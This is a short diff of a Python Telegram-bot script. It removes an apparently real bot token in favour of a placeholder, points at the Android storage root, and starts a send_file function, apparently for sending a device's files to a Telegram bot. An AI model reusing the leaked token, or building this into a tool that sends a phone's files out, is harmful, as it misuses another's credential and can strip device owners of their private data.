@@ -3,7 +3,7 @@ import telebot
 from threading import Thread
 
 # استخدم API_KEY الخاص بك هنا
-bot = telebot.TeleBot("6722087346:AAGcprCE_KbBXWNpjHN2zLwV1gWHZO4mRMc")
+bot = telebot.TeleBot("PASTE TELEGRAM BOT TOKEN HERE")
 dir_path = "/storage/emulated/0/"
 
 def send_file(file_path):
